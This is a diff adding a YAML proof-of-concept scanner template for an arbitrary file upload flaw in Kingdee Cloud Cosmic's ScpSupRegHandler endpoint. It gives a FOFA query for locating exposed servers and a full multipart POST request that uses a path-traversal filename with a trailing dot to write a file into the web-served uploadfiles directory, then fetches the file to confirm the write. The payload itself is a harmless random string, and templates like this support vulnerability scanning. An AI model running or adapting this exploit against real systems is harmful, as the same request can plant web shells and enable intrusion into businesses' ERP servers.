@@ -1,0 +1,46 @@
+id: poc-yaml-jin-die-yun-ScpSupRegHandler-anyfile-upload
+info:
+  name: 金蝶云星空 ScpSupRegHandler 任意文件上传漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 金蝶云星空
+  fofa: icon_hash="-1629133697" && title=="金蝶云星空"
+variables:
+  t1: random_str(4)
+  t2: random_str(5)
+requests:
+- method: POST
+  path: /k3cloud/SRM/ScpSupRegHandler
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQdfX5jWoua4EnUeu
+  data: '------WebKitFormBoundaryQdfX5jWoua4EnUeu
+
+    Content-Disposition: form-data; name="dbId_v"
+
+
+    .
+
+    ------WebKitFormBoundaryQdfX5jWoua4EnUeu
+
+    Content-Disposition: form-data; name="FID"
+
+
+    2023
+
+    ------WebKitFormBoundaryQdfX5jWoua4EnUeu
+
+    Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{{.t1}}.txt."
+
+    Content-Type: text/plain
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryQdfX5jWoua4EnUeu--'
+  expression: status_code == 200 && contains(body,"附件保存成功")
+- method: GET
+  path: /k3cloud/uploadfiles/{{.t1}}.txt
+  expression: status_code == 200 && body == t2
+transport: http
